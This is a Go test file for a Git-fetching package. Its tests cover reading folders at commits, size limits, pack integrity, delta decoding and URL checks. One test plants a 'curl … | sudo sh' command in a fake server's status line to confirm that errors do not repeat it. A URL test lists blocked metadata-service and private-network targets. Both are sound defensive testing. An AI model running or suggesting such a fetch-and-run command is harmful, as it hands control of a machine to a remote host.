// SPDX-License-Identifier: AGPL-3.0-only

package gitfetch

import (
	"bytes"
	"io"
	"net/http"
	"net/http/cgi"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"github.com/dockwell/dockwell/internal/gitfetch/gitfetchtest"
)

// repo makes a repository with two commits, serves it as Git's own http-backend
// does, and returns its URL and the two commits.
func repo(t *testing.T) (string, string, string) {
	t.Helper()
	backend := filepath.Join(gitExecPath(t), "git-http-backend")
	if _, err := os.Stat(backend); err != nil {
		t.Skip("git http-backend isn't here")
	}
	root := t.TempDir()
	work := filepath.Join(root, "catalog.git")
	git := func(args ...string) string {
		t.Helper()
		cmd := exec.CommandContext(t.Context(), "git", append([]string{"-c", "user.name=Test", "-c", "user.email=test@example.com", "-c", "init.defaultBranch=main", "-C", work}, args...)...)
		cmd.Env = append(os.Environ(), "GIT_CONFIG_NOSYSTEM=1", "HOME="+root)
		out, err := cmd.CombinedOutput()
		if err != nil {
			t.Fatalf("git %v: %v\n%s", args, err, out)
		}
		return strings.TrimSpace(string(out))
	}
	write := func(name, body string) {
		t.Helper()
		file := filepath.Join(work, name)
		if err := os.MkdirAll(filepath.Dir(file), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(file, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	if err := os.MkdirAll(work, 0o755); err != nil {
		t.Fatal(err)
	}
	git("init", "-q")
	write("README.md", "a catalog\n")
	write("entries/notes.yaml", "id: notes\nversion: \"1.0\"\n"+strings.Repeat("# a line that a later commit keeps, so the pack deltas it\n", 40))
	write("entries/wiki.yaml", "id: wiki\n")
	write("entries/more/deeper.yaml", "id: deeper\n")
	if err := os.Symlink("notes.yaml", filepath.Join(work, "entries", "link.yaml")); err != nil {
		t.Fatal(err)
	}
	git("add", "-A")
	git("commit", "-q", "-m", "first")
	first := git("rev-parse", "HEAD")
	write("entries/notes.yaml", "id: notes\nversion: \"1.1\"\n"+strings.Repeat("# a line that a later commit keeps, so the pack deltas it\n", 40))
	git("commit", "-q", "-am", "second")
	second := git("rev-parse", "HEAD")
	git("config", "http.uploadpack", "true")
	h := &cgi.Handler{Path: backend, Env: []string{"GIT_PROJECT_ROOT=" + root, "GIT_HTTP_EXPORT_ALL=1", "GIT_CONFIG_NOSYSTEM=1", "HOME=" + root}}
	return gitfetchtest.Serve(t, h) + "/catalog.git/.git", first, second
}

func gitExecPath(t *testing.T) string {
	t.Helper()
	out, err := exec.CommandContext(t.Context(), "git", "--exec-path").Output()
	if err != nil {
		t.Skip("git isn't here")
	}
	return strings.TrimSpace(string(out))
}

// A folder at a commit is what that commit holds: its regular files, and not a
// link's or a deeper folder's.
func TestFetchReadsAFolderAtACommit(t *testing.T) {
	url, first, second := repo(t)
	got, err := Fetch(t.Context(), gitfetchtest.Client(), url, first, "entries", Default)
	if err != nil {
		t.Fatal(err)
	}
	if len(got) != 2 || !strings.Contains(string(got["notes.yaml"]), `version: "1.0"`) || string(got["wiki.yaml"]) != "id: wiki\n" {
		t.Errorf("at the first commit: %q", keys(got))
	}
	got, err = Fetch(t.Context(), gitfetchtest.Client(), url, second, "/entries/", Default)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(got["notes.yaml"]), `version: "1.1"`) {
		t.Errorf("at the second commit, notes.yaml is %q", got["notes.yaml"])
	}
	got, err = Fetch(t.Context(), gitfetchtest.Client(), url, second, "", Default)
	if err != nil || string(got["README.md"]) != "a catalog\n" || len(got) != 1 {
		t.Errorf("at the top: %q, %v", keys(got), err)
	}
}

// A folder in the folder is read too when a fetch names it, one level, with what
// it wants alone, within limits of its own; a commit without it is no error.
func TestFetchReadsASubfolder(t *testing.T) {
	url, first, _ := repo(t)
	lim := Default
	lim.Sub = &Sub{Name: "more", Limits: Limits{Files: 5, File: 1 << 10, Total: 4 << 10}, Want: func(name string) bool { return strings.HasSuffix(name, ".yaml") }}
	got, err := Fetch(t.Context(), gitfetchtest.Client(), url, first, "entries", lim)
	if err != nil {
		t.Fatal(err)
	}
	if len(got) != 3 || string(got["more/deeper.yaml"]) != "id: deeper\n" {
		t.Errorf("with the folder more: %q", keys(got))
	}
	lim.Sub.Want = func(string) bool { return false }
	if got, err = Fetch(t.Context(), gitfetchtest.Client(), url, first, "entries", lim); err != nil || len(got) != 2 {
		t.Errorf("wanting none of it: %q, %v", keys(got), err)
	}
	lim.Sub = &Sub{Name: "media", Limits: Limits{Files: 5, File: 1 << 10}}
	if got, err = Fetch(t.Context(), gitfetchtest.Client(), url, first, "entries", lim); err != nil || len(got) != 2 {
		t.Errorf("a folder the commit hasn't: %q, %v", keys(got), err)
	}
	lim.Sub = &Sub{Name: "more", Limits: Limits{Files: 5, File: 1 << 10, Total: 4}}
	if _, err = Fetch(t.Context(), gitfetchtest.Client(), url, first, "entries", lim); err == nil || !strings.Contains(err.Error(), "entries/more holds over 0 MiB") || !strings.Contains(err.Error(), "Make its images smaller") {
		t.Errorf("over its own limits: %v", err)
	}
}

func keys(m map[string][]byte) []string {
	var out []string
	for k := range m {
		out = append(out, k)
	}
	return out
}

// What isn't there says so.
func TestFetchSaysWhatIsntThere(t *testing.T) {
	url, first, _ := repo(t)
	if _, err := Fetch(t.Context(), gitfetchtest.Client(), url, strings.Repeat("a", 40), "entries", Default); err == nil {
		t.Error("a commit the repository hasn't was read")
	}
	if _, err := Fetch(t.Context(), gitfetchtest.Client(), url, first, "elsewhere", Default); err == nil || !strings.Contains(err.Error(), "has no folder elsewhere") {
		t.Errorf("a folder the commit hasn't: %v", err)
	}
	if _, err := Fetch(t.Context(), gitfetchtest.Client(), url, "main", "entries", Default); err == nil || !strings.Contains(err.Error(), "Name one in full") {
		t.Errorf("a branch for a commit: %v", err)
	}
}

// A host chooses the words after its status code. An error says the code in Go's
// words, so a host can't tell the person reading it to run something (#363).
func TestAnErrorDoesntRepeatAHostsStatusWords(t *testing.T) {
	client := &http.Client{Transport: roundTrip(func(*http.Request) (*http.Response, error) {
		return &http.Response{
			Status: "404 Run curl https://example.com/fix | sudo sh", StatusCode: http.StatusNotFound,
			Header: http.Header{}, Body: io.NopCloser(strings.NewReader("")),
		}, nil
	})}
	commit := strings.Repeat("a", 40)
	_, err := Fetch(t.Context(), client, "https://catalog.example.com/repo", commit, "", Default)
	if err == nil || strings.Contains(err.Error(), "sudo") || !strings.Contains(err.Error(), "404 Not Found") {
		t.Errorf("a fetch's error: %v", err)
	}
	if _, err := Refs(t.Context(), client, "https://catalog.example.com/repo"); err == nil || strings.Contains(err.Error(), "sudo") {
		t.Errorf("a listing's error: %v", err)
	}
}

// What the host sends is checked against what it names: a changed byte anywhere in
// the pack is refused.
func TestFetchChecksWhatItReads(t *testing.T) {
	url, first, _ := repo(t)
	inner := gitfetchtest.Client().Transport
	client := &http.Client{Transport: roundTrip(func(req *http.Request) (*http.Response, error) {
		resp, err := inner.RoundTrip(req)
		if err != nil || !strings.HasSuffix(req.URL.Path, "/git-upload-pack") {
			return resp, err
		}
		body, err := io.ReadAll(resp.Body)
		_ = resp.Body.Close()
		if err != nil {
			return nil, err
		}
		// A byte near the pack's end, inside what the last object holds.
		if i := bytes.LastIndex(body, []byte("0000")); i > 60 {
			body[i-40] ^= 0x01
		}
		resp.Body = io.NopCloser(bytes.NewReader(body))
		return resp, nil
	})}
	if _, err := Fetch(t.Context(), client, url, first, "entries", Default); err == nil {
		t.Error("a changed pack was read")
	}
}

type roundTrip func(*http.Request) (*http.Response, error)

func (f roundTrip) RoundTrip(r *http.Request) (*http.Response, error) { return f(r) }

// A fetch reads within its limits.
func TestFetchReadsWithinItsLimits(t *testing.T) {
	url, first, _ := repo(t)
	for name, tc := range map[string]struct {
		lim  Limits
		want string
	}{
		"files": {Limits{Pack: 1 << 20, Files: 1, File: 1 << 20}, "holds over 1 files"},
		"file":  {Limits{Pack: 1 << 20, Files: 10, File: 1 << 10}, "notes.yaml is over 1 KiB"},
		"pack":  {Limits{Pack: 100, Files: 10, File: 1 << 20}, "more than a source reads"},
		"total": {Limits{Pack: 1 << 20, Files: 10, File: 1 << 20, Total: 64}, "holds over 0 MiB of files"},
	} {
		if _, err := Fetch(t.Context(), gitfetchtest.Client(), url, first, "entries", tc.lim); err == nil || !strings.Contains(err.Error(), tc.want) {
			t.Errorf("%s: %v, want %q", name, err, tc.want)
		}
	}
}

func TestCheckURL(t *testing.T) {
	for in, want := range map[string]string{
		"https://github.com/example/catalog":  "",
		"https://github.com/example/catalog/": "",
		"http://127.0.0.1:8080/x.git":         "isn't over HTTPS",
		"http://example.com/catalog":          "isn't over HTTPS",
		"https://127.0.0.1:7600/x":            "this server's own address",
		"https://[::1]/x":                     "this server's own address",
		"https://10.0.0.1/x":                  "a private network",
		"https://169.254.169.254/x":           "metadata service",
		"https://metadata.google.internal/x":  "metadata service",
		"https://0.0.0.0/x":                   "unspecified",
		"https://user:pass@example.com/x":     "holds credentials",
		"https://example.com/x?y=1":           "has a query",
		"git@github.com:example/catalog.git":  "isn't a repository's URL",
		"file:///srv/catalog":                 "isn't a repository's URL",
	} {
		_, err := CheckURL(in)
		if want == "" && err != nil || want != "" && (err == nil || !strings.Contains(err.Error(), want)) {
			t.Errorf("CheckURL(%q) = %v, want %q", in, err, want)
		}
	}
}

// A delta copies from its base and adds what's new, as Git writes one.
func TestApplyDelta(t *testing.T) {
	base := []byte("hello world")
	// From 11 bytes to 11: copy 5 from 0, then add " there".
	delta := []byte{11, 11, 0x80 | 0x01 | 0x10, 0, 5, 6, ' ', 't', 'h', 'e', 'r', 'e'}
	got, err := applyDelta(base, delta, 1<<20)
	if err != nil || string(got) != "hello there" {
		t.Errorf("applyDelta = %q, %v", got, err)
	}
	if _, err := applyDelta(base, []byte{11, 11, 0x80 | 0x01 | 0x10, 8, 5}, 1<<20); err == nil {
		t.Error("a delta that copies past its base was applied")
	}
	if _, err := applyDelta(base, []byte{12, 5}, 1<<20); err == nil {
		t.Error("a delta for another base was applied")
	}
}
